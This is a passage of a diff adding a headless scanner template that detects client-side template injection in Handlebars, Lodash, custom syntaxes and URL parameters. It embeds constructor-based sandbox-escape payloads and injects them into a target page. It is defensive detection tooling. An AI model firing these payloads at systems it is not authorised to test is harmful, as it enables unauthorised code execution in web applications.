+        \          context: 'template_compilation',\n                  severity: 'high',\n\
+        \                  confirmed: window['handlebarsTest' + i] === true,\n   \
+        \               result: result\n                });\n              }\n   \
+        \         } catch (e) {\n              // Template compilation might fail\
+        \ for malicious payloads\n              if (e.message.indexOf('constructor')\
+        \ !== -1 || e.message.indexOf('prototype') !== -1) {\n                window.templateInjectionResults.vulnerabilities.push({\n\
+        \                  type: 'handlebars_template_injection',\n              \
+        \    engine: 'Handlebars',\n                  payload: payload,\n        \
+        \          context: 'compilation_error',\n                  severity: 'medium',\n\
+        \                  confirmed: false,\n                  error: e.message\n\
+        \                });\n              }\n            }\n          }\n\n    \
+        \    } catch (e) {\n          window.templateInjectionResults.test_results.push('handlebars_payload_'\
+        \ + i + '_error: ' + e.message);\n        }\n      }\n\n    } catch (e) {\n\
+        \      window.templateInjectionResults.test_results.push('handlebars_test_error:\
+        \ ' + e.message);\n    }\n  }\n\n  return window.templateInjectionResults;\n\
+        })();\n"
+    name: test_handlebars_injection
+  - action: script
+    args:
+      code: "(function() {\n  window.templateInjectionResults.test_results.push('lodash_injection');\n\
+        \n  if (window.templateInjectionResults.template_engines.lodash.present) {\n\
+        \n    var lodashPayloads = [\n      '<%= 7*7 %>',\n      '<%= this.constructor.constructor(\"\
+        alert(1)\")() %>',\n      '<%= constructor.constructor(\"alert(1)\")() %>',\n\
+        \      '<%= (function(){return this})().constructor.constructor(\"alert(1)\"\
+        )() %>',\n      '<%= (\"\").constructor.constructor(\"alert(1)\")() %>'\n\
+        \    ];\n\n    window.templateInjectionResults.payloads_tested =\n      window.templateInjectionResults.payloads_tested.concat(lodashPayloads);\n\
+        \n    try {\n      for (var i = 0; i < lodashPayloads.length; i++) {\n   \
+        \     var payload = lodashPayloads[i];\n        try {\n          window['lodashTest'\
+        \ + i] = false;\n\n          var testPayload = payload.replace('alert(1)',\
+        \ 'window.lodashTest' + i + '=true');\n\n          // Test Lodash template\
+        \ compilation\n          if (typeof _ !== 'undefined' && _.template) {\n \
+        \           try {\n              var template = _.template(testPayload);\n\
+        \              var result = template();\n\n              if (window['lodashTest'\
+        \ + i] === true ||\n                  (typeof result === 'string' && result.indexOf('49')\
+        \ !== -1)) { // 7*7 = 49\n\n                window.templateInjectionResults.vulnerabilities.push({\n\
+        \                  type: 'lodash_template_injection',\n                  engine:\
+        \ 'Lodash',\n                  payload: payload,\n                  context:\
+        \ 'template_compilation',\n                  severity: 'high',\n         \
+        \         confirmed: window['lodashTest' + i] === true,\n                \
+        \  result: result\n                });\n              }\n            } catch\
+        \ (e) {\n              // Template compilation error might indicate vulnerability\
+        \ attempt\n              if (e.message.indexOf('constructor') !== -1 ||\n\
+        \                  e.message.indexOf('process') !== -1 ||\n              \
+        \    e.message.indexOf('require') !== -1) {\n                window.templateInjectionResults.vulnerabilities.push({\n\
+        \                  type: 'lodash_template_injection',\n                  engine:\
+        \ 'Lodash',\n                  payload: payload,\n                  context:\
+        \ 'compilation_error',\n                  severity: 'medium',\n          \
+        \        confirmed: false,\n                  error: e.message\n         \
+        \       });\n              }\n            }\n          }\n\n        } catch\
+        \ (e) {\n          window.templateInjectionResults.test_results.push('lodash_payload_'\
+        \ + i + '_error: ' + e.message);\n        }\n      }\n\n    } catch (e) {\n\
+        \      window.templateInjectionResults.test_results.push('lodash_test_error:\
+        \ ' + e.message);\n    }\n  }\n\n  return window.templateInjectionResults;\n\
+        })();\n"
+    name: test_lodash_injection
+  - action: script
+    args:
+      code: "(function() {\n  window.templateInjectionResults.test_results.push('custom_template_injection');\n\
+        \n  // Test various interpolation syntaxes found in page\n  var customPayloads\
+        \ = [\n    { syntax: '{{}}', payloads: ['{{7*7}}', '{{constructor.constructor}}']\
+        \ },\n    { syntax: '<%%>', payloads: ['<%=7*7%>', '<%=constructor.constructor%>']\
+        \ },\n    { syntax: '${}', payloads: ['${7*7}', '${constructor.constructor}']\
+        \ },\n    { syntax: '[[]]', payloads: ['[[7*7]]', '[[constructor.constructor]]']\
+        \ },\n    { syntax: '#{}', payloads: ['#{7*7}', '#{constructor.constructor}']\
+        \ }\n  ];\n\n  // Test for reflection of payloads in page content\n  try {\n\
+        \    for (var i = 0; i < customPayloads.length; i++) {\n      var syntaxGroup\
+        \ = customPayloads[i];\n      for (var j = 0; j < syntaxGroup.payloads.length;\
+        \ j++) {\n        var payload = syntaxGroup.payloads[j];\n        try {\n\
+        \          // Create a test element with the payload\n          var testDiv\
+        \ = document.createElement('div');\n          testDiv.innerHTML = payload;\n\
+        \          testDiv.setAttribute('data-test-payload', payload);\n         \
+        \ document.body.appendChild(testDiv);\n\n          // Check if the payload\
+        \ gets processed/evaluated\n          setTimeout(function(groupIdx, payloadIdx,\
+        \ pl, syntax, element) {\n            return function() {\n              var\
+        \ elementContent = element.innerHTML;\n              var elementText = element.textContent;\n\
+        \n              // Check for mathematical evaluation (7*7 = 49)\n        \
+        \      if (elementContent.indexOf('49') !== -1 || elementText.indexOf('49')\
+        \ !== -1) {\n                window.templateInjectionResults.vulnerabilities.push({\n\
+        \                  type: 'custom_template_injection',\n                  engine:\
+        \ 'Unknown/Custom',\n                  syntax: syntax,\n                 \
+        \ payload: pl,\n                  context: 'mathematical_evaluation',\n  \
+        \                severity: 'medium',\n                  confirmed: true,\n\
+        \                  result: elementContent\n                });\n         \
+        \     }\n\n              // Check for constructor access\n              if\
+        \ (elementContent.indexOf('function') !== -1 ||\n                  elementContent.indexOf('constructor')\
+        \ !== -1 ||\n                  elementText.indexOf('function') !== -1) {\n\
+        \                window.templateInjectionResults.vulnerabilities.push({\n\
+        \                  type: 'custom_template_injection',\n                  engine:\
+        \ 'Unknown/Custom',\n                  syntax: syntax,\n                 \
+        \ payload: pl,\n                  context: 'constructor_access',\n       \
+        \           severity: 'high',\n                  confirmed: true,\n      \
+        \            result: elementContent\n                });\n              }\n\
+        \n              try {\n                document.body.removeChild(element);\n\
+        \              } catch (e) {\n                // Element might already be\
+        \ removed\n              }\n            };\n          }(i, j, payload, syntaxGroup.syntax,\
+        \ testDiv), 300);\n\n        } catch (e) {\n          window.templateInjectionResults.test_results.push(\n\
+        \            'custom_payload_' + i + '_' + j + '_error: ' + e.message\n  \
+        \        );\n        }\n      }\n    }\n\n  } catch (e) {\n    window.templateInjectionResults.test_results.push('custom_template_test_error:\
+        \ ' + e.message);\n  }\n\n  return window.templateInjectionResults;\n})();\n"
+    name: test_custom_template_injection
+  - action: navigate
+    args:
+      url: '{{BaseURL}}?name={{7*7}}&template=<%=constructor.constructor%>&expr=${7*7}'
+  - action: waitload
+  - action: script
+    args:
+      code: "(function() {\n  window.templateInjectionResults.test_results.push('url_parameter_injection');\n\
+        \n  try {\n    // Check if URL parameters are reflected and processed as templates\n\
+        \    var pageContent = document.documentElement.outerHTML;\n    var urlParams\
+        \ = new URLSearchParams(window.location.search);\n\n    // Check for mathematical\
+        \ evaluation in page content\n    if (pageContent.indexOf('49') !== -1) {\n\
+        \      window.templateInjectionResults.vulnerabilities.push({\n        type:\
+        \ 'url_parameter_template_injection',\n        engine: 'Server/Client-side\
+        \ processing',\n        vector: 'URL parameters',\n        payload: '{{7*7}}\
+        \ or ${7*7}',\n        context: 'url_parameter_reflection',\n        severity:\
+        \ 'high',\n        confirmed: true,\n        description: 'URL parameters\
+        \ are processed as template expressions'\n      });\n    }\n\n    // Check\
+        \ for constructor/function reflection\n    if (pageContent.indexOf('function')\
+        \ !== -1 &&\n        (pageContent.indexOf('constructor') !== -1 || urlParams.has('template')))\
+        \ {\n      window.templateInjectionResults.vulnerabilities.push({\n      \
+        \  type: 'url_parameter_template_injection',\n        engine: 'Server/Client-side\
+        \ processing',\n        vector: 'URL parameters',\n        payload: '<%=constructor.constructor%>',\n\
+        \        context: 'constructor_access_via_url',\n        severity: 'critical',\n\
+        \        confirmed: true,\n        description: 'Constructor access via URL\
+        \ parameter template injection'\n      });\n    }\n\n  } catch (e) {\n   \
+        \ window.templateInjectionResults.test_results.push('url_parameter_test_error:\
+        \ ' + e.message);\n  }\n\n  return window.templateInjectionResults;\n})();\n"
+    name: test_url_parameter_injection
+  - action: script
+    args:
+      code: "(function() {\n  // Calculate comprehensive template injection risk score\n\
+        \  var riskScore = 0;\n  var confirmedVulns = [];\n\n  for (var i = 0; i <\
+        \ window.templateInjectionResults.vulnerabilities.length; i++) {\n    if (window.templateInjectionResults.vulnerabilities[i].confirmed)\
+        \ {\n      confirmedVulns.push(window.templateInjectionResults.vulnerabilities[i]);\n\
+        \    }\n  }\n\n  for (var j = 0; j < confirmedVulns.length; j++) {\n    var\
+        \ vuln = confirmedVulns[j];\n    switch (vuln.severity) {\n      case 'critical':\
+        \ riskScore += 40; break;\n      case 'high': riskScore += 30; break;\n  \
+        \    case 'medium': riskScore += 20; break;\n      case 'low': riskScore +=\
+        \ 10; break;\n    }\n  }\n\n  // Additional risk factors\n  var templateEnginesPresent\
+        \ = 0;\n  var engines = window.templateInjectionResults.template_engines;\n\
+        \n  for (var engineName in engines) {\n    var engine = engines[engineName];\n\
+        \    if (engine.present || (engine.directives && engine.directives > 0)) {\n\
+        \      templateEnginesPresent++;\n    }\n  }\n\n  riskScore += templateEnginesPresent\
+        \ * 5;\n\n  window.templateInjectionResults.risk_assessment = {\n    total_vulnerabilities:\
+        \ confirmedVulns.length,\n    template_engines_detected: templateEnginesPresent,\n\
+        \    risk_score: Math.min(riskScore, 100),\n    risk_level: riskScore > 70\
+        \ ? 'Critical' :\n               riskScore > 50 ? 'High' :\n             \
+        \  riskScore > 30 ? 'Medium' : 'Low',\n    payloads_tested: window.templateInjectionResults.payloads_tested.length,\n\
+        \    test_coverage: window.templateInjectionResults.test_results.length,\n\
+        \    recommendations: []\n  };\n\n  window.templateInjectionResults.summary\
+        \ = {\n    scan_completed: true,\n    timestamp: new Date().toISOString(),\n\
+        \    template_injection_vulnerabilities_found: confirmedVulns.length > 0,\n\
+        \    engines_analyzed: templateEnginesPresent,\n    comprehensive_testing_completed:\
+        \ true\n  };\n\n  return window.templateInjectionResults;\n})();\n"
+    name: final_template_assessment
+id: headless-template-injection
+info:
+  author: geeknik
+  description: 'Advanced client-side template injection detection using Headless Protocol
+    for
+
+    comprehensive template engine analysis. This template performs template syntax
+
+    testing, expression evaluation, and sandbox escape detection across multiple
+
+    client-side template engines including Angular, Vue.js, Handlebars, Mustache,
+
+    and custom template systems while maintaining defensive research principles.
+
+    '
+  name: Client-Side Template Injection Detector
+  reference:
+  - https://portswigger.net/research/server-side-template-injection
+  - https://owasp.org/www-project-web-security-testing-guide/
+  - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+  severity: high
+  tags: template-injection,client-side,headless,angular,vue,handlebars,defensive
